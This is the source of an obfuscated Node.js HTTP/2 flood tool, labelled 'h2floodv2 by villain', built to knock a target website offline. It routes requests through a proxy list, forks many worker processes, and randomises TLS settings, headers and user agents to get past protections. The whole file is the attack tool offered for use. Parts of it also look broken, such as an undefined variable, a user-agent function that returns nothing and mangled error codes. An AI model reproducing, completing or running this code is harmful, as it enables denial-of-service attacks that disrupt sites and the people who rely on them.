const net = require("net");

const http2 = require("http2");

const tls = require("tls");

const cluster = require("cluster");

const url = require("url");

const crypto = require("crypto");

const fs = require("fs");

const {
  userInfo
} = require("os");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");

function getRandomTLSCiphersuite() {
  const _0x2bdf0d = ["TLS_AES_128_CCM_8_SHA256", "TLS_AES_128_CCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256"];

  const _0x2de1ef = _0x2bdf0d[Math.floor(Math.random() * _0x2bdf0d.length)];

  return _0x2de1ef;
}

const randomTLSCiphersuite = getRandomTLSCiphersuite();
const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"],
      cache_header = ["max-age=0", "no-cache", "no-store", "pre-check=0", "post-check=0", "must-revalidate", "proxy-revalidate", "s-maxage=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "no-cache, no-store,private, max-age=604800, must-revalidate"],
      language_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5", "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", "pt-BR,pt;q=0.9", "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", "ru-RU,ru;q=0.9", "si-LK,si;q=0.9", "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", "sq-AL,sq;q=0.9", "sr-Cyrl-RS,sr;q=0.9", "sr-Latn-RS,sr;q=0.9", "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", "te-IN,te;q=0.9", "th-TH,th;q=0.9", "tr-TR,tr;q=0.9", "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", "uz-Latn-UZ,uz;q=0.9", "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", "zh-TW,zh;q=0.9", "am-ET,am;q=0.8", "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", "bs-Cyrl-BA,bs;q=0.8", "bs-Latn-BA,bs;q=0.8", "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", "fr-CH,fr;q=0.8", "fr-BE,fr;q=0.8", "fr-LU,fr;q=0.8", "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", "is-IS,is;q=0.8", "jv-Latn-ID,jv;q=0.8", "ka-GE,ka;q=0.8", "kkj-CM,kkj;q=0.8", "kl-GL,kl;q=0.8", "km-KH,km;q=0.8", "kok-IN,kok;q=0.8", "ks-Arab-IN,ks;q=0.8", "lb-LU,lb;q=0.8", "ln-CG,ln;q=0.8", "mn-Mong-CN,mn;q=0.8", "mr-MN,mr;q=0.8", "ms-BN,ms;q=0.8", "mt-MT,mt;q=0.8", "mua-CM,mua;q=0.8", "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", "nso-ZA,nso;q=0.8", "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", "ps-AF,ps;q=0.8", "quz-BO,quz;q=0.8", "quz-EC,quz;q=0.8", "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", "rw-RW,rw;q=0.8", "sd-Arab-PK,sd;q=0.8", "se-NO,se;q=0.8", "si-LK,si;q=0.8", "smn-FI,smn;q=0.8", "sms-FI,sms;q=0.8", "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", "ti-ER,ti;q=0.8", "tk-TM,tk;q=0.8", "tn-ZA,tn;q=0.8", "tt-RU,tt;q=0.8", "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", "ve-ZA,ve;q=0.8", "wo-SN,wo;q=0.8", "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"];
const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
const sigalgs = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"];
let SignalsList = sigalgs.join(":");
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_TLSv1_3 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
  console.log("h2floodv2 by villain");
  process.exit();
}

const secureProtocol = "TLS_method";
const secureContextOptions = {
  "ciphers": ciphers,
  "sigalgs": SignalsList,
  "honorCipherOrder": true,
  "secureOptions": secureOptions,
  "secureProtocol": secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
  "target": process.argv[2],
  "time": ~~process.argv[3],
  "Rate": ~~process.argv[4],
  "threads": ~~process.argv[5],
  "proxyFile": process.argv[6],
  "input": process.argv[7]
};
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    console.clear();
    console.log("ATTACK START".rainbow);
    process.stdout.write("Loading: 10%\n".blue);
    setTimeout(() => {
      process.stdout.write("\rLoading: 50%\n".blue);
    }, 500 * process.argv[3]);
    setTimeout(() => {
      process.stdout.write("\rLoading: 100%\n".blue);
    }, process.argv[3] * 1000);
    cluster.fork();
  }
} else {
  for (let i = 0; i < args.Rate; i++) {
    setInterval(runFlooder, randomIntn(1, 10));
  }
}

class NetSocket {
  constructor() {}

  ["HTTP"](_0x38c2ab, _0x464fb8) {
    const _0x144123 = _0x38c2ab.address.split(":");

    const _0x58f33b = "CONNECT " + _0x38c2ab.address + ":443 HTTP/1.1\r\nHost: " + _0x38c2ab.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";

    const _0x4094b4 = new Buffer.from(_0x58f33b);

    const _0x266d62 = net.connect({
      "host": _0x38c2ab.host,
      "port": _0x38c2ab.port,
      "allowHalfOpen": true,
      "writable": true,
      "readable": true
    });

    _0x266d62.setTimeout(_0x38c2ab.timeout * 600000);

    _0x266d62.setKeepAlive(true, 600000);

    _0x266d62.setNoDelay(true);

    _0x266d62.on("connect", () => {
      _0x266d62.write(_0x4094b4);
    });

    _0x266d62.on("data", _0x4794bc => {
      const _0x26ce07 = _0x4794bc.toString("utf-8");

      const _0x3ce667 = _0x26ce07.includes("HTTP/1.1 200");

      if (_0x3ce667 === false) {
        _0x266d62.destroy();

        return _0x464fb8(undefined, "error: invalid response from proxy server");
      }

      return _0x464fb8(_0x266d62, undefined);
    });

    _0x266d62.on("timeout", () => {
      _0x266d62.destroy();

      return _0x464fb8(undefined, "error: timeout exceeded");
    });
  }

}

function getRandomInt(_0x838582, _0x6327c4) {
  return Math.floor(Math.random() * (_0x6327c4 - _0x838582 + 1)) + _0x838582;
}

async function generateRandomUserAgent() {
  const _0x4176a0 = ["Windows NT 10.0", "Macintosh; Intel Mac OS X 10_15_7", "Linux"];
  const _0x3981da = ["119.0.0.0"];

  const _0x49de86 = _0x4176a0[getRandomInt(0, _0x4176a0.length - 1)];

  const _0x1aead0 = "Mozilla/5.0 (" + _0x49de86 + ") AppleWebKit/" + getRandomInt(500, 600) + ".0 (KHTML, like Gecko) Chrome/" + _0x3981da + " Safari/" + getRandomInt(500, 600) + ".0";

  return _0x1aead0;
}

const secChUaValue = generateRandomUserAgent();

function getRandomUserAgent() {
  const _0x57a3a0 = ["Windows NT 10.0", "Macintosh", "X11", "Windows NT 6.1; Win64; x64", "Windows NT 5.1; Win64; x64", "Macintosh; Intel Mac OS X 10_14_6", "Macintosh; Intel Mac OS X 10_15_7", "Linux"];
  const _0x3111bb = ["Chrome", "Firefox", "Safari", "Edge", "Opera"];
  const _0x2ef152 = ["en-US", "en-GB", "fr-FR", "de-DE", "es-ES"];
  const _0x584905 = ["US", "GB", "FR", "DE", "ES"];
  const _0x435464 = ["Mozilla"];

  const _0x41aa63 = _0x57a3a0[Math.floor(Math.random() * _0x57a3a0.length)];

  const _0xc22791 = _0x3111bb[Math.floor(Math.random() * _0x3111bb.length)];

  const _0x1d3ccd = _0x2ef152[Math.floor(Math.random() * _0x2ef152.length)];

  const _0x5df4b5 = _0x584905[Math.floor(Math.random() * _0x584905.length)];

  const _0x2659db = _0x435464[Math.floor(Math.random() * _0x435464.length)];

  const _0x2bcffa = "" + firefoxVersion;

  const _0x5bf2a7 = Math.floor(Math.random() * 6) + 1;

  const _0x32fe3d = _0x2659db + "/" + _0xc22791 + " " + _0x2bcffa + "." + _0x2bcffa + "." + _0x2bcffa + " (" + _0x41aa63 + "; " + _0x5df4b5 + "; " + _0x1d3ccd + ")";

  _0x2659db + "/" + _0xc22791 + " " + _0x2bcffa + "." + _0x2bcffa + "." + _0x2bcffa + " (" + _0x41aa63 + "; " + _0x5df4b5 + "; " + _0x1d3ccd + ")";

  const _0x2c9943 = btoa(_0x32fe3d);

  let _0x59dc4f = "";

  for (let _0x5b5630 = 0; _0x5b5630 < _0x2c9943.length; _0x5b5630++) {
    if (_0x5b5630 % _0x5bf2a7 === 0) {
      _0x59dc4f += _0x2c9943.charAt(_0x5b5630);
    } else {
      _0x59dc4f += _0x2c9943.charAt(_0x5b5630).toUpperCase();
    }
  }
}

function cookieString(_0x2515d2) {
  var _0x70ceab = "";

  for (var _0x53a33c in _0x2515d2) {
    _0x70ceab = _0x70ceab + " " + _0x2515d2[_0x53a33c].name + "=" + _0x2515d2[_0x53a33c].value + ";";
  }

  var _0x70ceab = _0x70ceab.substring(1);

  return _0x70ceab.substring(0, _0x70ceab.length - 1);
}

const Socker = new NetSocket();

function readLines(_0x329253) {
  return fs.readFileSync(_0x329253, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(_0x409320, _0x3630f9) {
  return Math.floor(Math.random() * (_0x3630f9 - _0x409320) + _0x409320);
}

function randomElement(_0x420614) {
  return _0x420614[randomIntn(0, _0x420614.length)];
}

function runFlooder() {
  const _0xc7b028 = randomElement(proxies);

  const _0x4414e4 = _0xc7b028.split(":");

  const _0x2088a7 = parsedTarget.protocol == "https:" ? "443" : "80";

  let _0x22e8f0;

  if (args.input === "flood") {
    process.stdout.write("flood\r");
    _0x22e8f0 = 1000;
  } else if (args.input === "bypass") {
    process.stdout.write("success bypass\r");

    function _0x1fcadb(_0x32a599, _0x4a1fae) {
      return Math.floor(Math.random() * (_0x4a1fae - _0x32a599 + 1)) + _0x32a599;
    }

    _0x22e8f0 = _0x1fcadb(1000, 6000);
  } else {
    process.stdout.write("default : flood\r");
    _0x22e8f0 = 1000;
  }

  platform = ["Windows", "Macintosh", "Linux", "iOS", "Android", "PlayStation 4", "iPhone", "iPad", "Other"];
  encoding_header = ["gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity"];
  let _0x4858bc = {
    ":authority": parsedTarget.host,
    ":method": "GET",
    "Accept": accept_header[Math.floor(Math.random() * accept_header.length)],
    ":path": parsedTarget.path,
    "sec-ch-ua-platform": platform[Math.floor(Math.random() * platform.length)],
    ":scheme": "https",
    "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
    "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
    "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
    "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
    "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
    "sec-ch-ua": secChUaValue,
    "accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
    "upgrade-insecure-requests": "1",
    "user-agent": getRandomUserAgent()
  };
  const _0x16a456 = {
    "host": _0x4414e4[0],
    "port": ~~_0x4414e4[1],
    "address": parsedTarget.host + ":443",
    "user-agent": getRandomUserAgent(),
    "timeout": 15
  };
  Socker.HTTP(_0x16a456, (_0x4a618e, _0x30673d) => {
    if (_0x30673d) return;

    _0x4a618e.setKeepAlive(true, 600000);

    _0x4a618e.setNoDelay(true);

    const _0x546357 = {
      "enablePush": false,
      "initialWindowSize": 1073741823
    };
    const _0x42ffea = {
      "port": _0x2088a7,
      "secure": true,
      "ALPNProtocols": ["h2", "http/1.1", "spdy/3.1"],
      "ciphers": randomTLSCiphersuite,
      "sigalgs": sigalgs,
      "requestCert": true,
      "socket": _0x4a618e,
      "decodeEmails": false,
      "ecdhCurve": ecdhCurve,
      "honorCipherOrder": false,
      "host": parsedTarget.host,
      "rejectUnauthorized": false,
      "followAllRedirects": true,
      "secureOptions": secureOptions,
      "secureContext": secureContext,
      "servername": parsedTarget.host,
      "secureProtocol": secureProtocol
    };

    const _0x86adfc = tls.connect(_0x2088a7, parsedTarget.host, _0x42ffea);

    _0x86adfc.allowHalfOpen = true;

    _0x86adfc.setNoDelay(true);

    _0x86adfc.setKeepAlive(true, 600000);

    _0x86adfc.setMaxListeners(0);

    const _0x4d7bbe = http2.connect(parsedTarget.href, {
      "protocol": "https:",
      "settings": {
        "headerTableSize": 4096,
        "maxConcurrentStreams": 1000,
        "initialWindowSize": 65535,
        "maxHeaderListSize": 32768,
        "maxFrameSize": 16384,
        "maxConnectionDuration": 1200,
        "enablePush": false
      },
      "maxSessionMemory": 3333,
      "maxDeflateDynamicTableSize": 4294967295,
      "createConnection": () => _0x86adfc,
      "socket": _0x4a618e
    });

    _0x4d7bbe.settings({
      "headerTableSize": 4096,
      "maxConcurrentStreams": 1000,
      "initialWindowSize": 65535,
      "maxHeaderListSize": 32768,
      "maxConnectionDuration": 1200,
      "maxFrameSize": 16384,
      "enablePush": false
    });

    _0x4d7bbe.setMaxListeners(0);

    _0x4d7bbe.settings(_0x546357);

    _0x4d7bbe.on("connect", () => {
      return;
    });

    _0x4d7bbe.on("close", () => {
      _0x4d7bbe.destroy();

      _0x4a618e.destroy();

      return;
    });

    _0x4d7bbe.on("timeout", () => {
      _0x4d7bbe.destroy();

      _0x4a618e.destroy();

      return;
    });

    _0x4d7bbe.on("error", _0x30673d => {
      if (_0x30673d.code === "ERR_HTTP2_GOAWAY_SESSIONaaaaaa") {
        console.log("Received GOAWAY error, pausing requests for 10 seconds\r");
        shouldPauseRequests = false;
        setTimeout(() => {
          shouldPauseRequests = false;
        }, 2000);
      } else if (_0x30673d.code === "ECONNRESETaa") {
        shouldPauseRequests = false;
        setTimeout(() => {
          shouldPauseRequests = false;
        }, 5000);
      } else {
        const _0x286165 = _0x30673d.response ? _0x30673d.response.statusCode : null;

        if (_0x286165 >= 520 && _0x286165 <= 529) {
          shouldPauseRequests = false;
          setTimeout(() => {
            shouldPauseRequests = false;
          }, 2000);
        } else if (_0x286165 >= 531 && _0x286165 <= 539) {
          setTimeout(() => {
            shouldPauseRequests = false;
          }, 2000);
        } else {}
      }

      _0x4d7bbe.destroy();

      _0x4a618e.destroy();

      return;
    });
  });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);
process.on("uncaughtException", _0x199ab4 => {});
process.on("unhandledRejection", _0x8fac51 => {});
_0xodL = "jsjiami.com.v6";